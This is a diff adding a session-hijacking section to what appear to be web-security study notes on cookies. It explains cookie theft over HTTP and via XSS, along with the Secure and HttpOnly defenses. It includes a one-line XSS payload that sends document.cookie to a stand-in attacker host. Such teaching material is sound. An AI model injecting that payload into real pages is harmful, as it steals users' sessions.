@@ -136,3 +136,15 @@ When the server Set-Cookie, cookie have some basic attributes:
 
 The Cookies setting don't obey Same Origin Policy, because cookies were created before Same Origin Policy, they have different security model. Sometimes Cookies are more restrictive than Same Origin Policy, like `Path` partions cookies by path, but is ineffective, because pages on same origin can access each other's DOMs, run code in each other's contexts;The other time Cookies are less restrictive than Same Origin Policy, like Pages with same hostname can share the cookies, the protocol and port are ignored, and different origins(e.g. subdomain) can mess with each others cookies.
 
+### Session hijacking
+
+#### Over Http steal cookie
+Sending cookies over unencrypted HTTP is a very bad idea.If anyone sees the cookie, they can use it to hijack the user's session, attacker sends victim's cookie as if it was their own, server will be fooled.  
+
+How to mitigation this session hijacking, use the `Set-Cookie: key=value; Secure` cookie attribute will prevent cookie from being sent over unencrypted HTTP connections. An even better solution is use https for entire website.
+
+#### XSS steal cookie
+XSS is Cross Site Scripting. What if attacker can insert their code into the webpage? At this point, they can easily exfiltrate the user's cookie. `new Image().src='http://attacker.com/steal?cookie=' + document.cookie`.
+
+The `HttpOnly` cookie attribute can prevent cookie from being read from JavaScript, use `Set-Cookie: key=value; Secure; HttpOnly`.
+
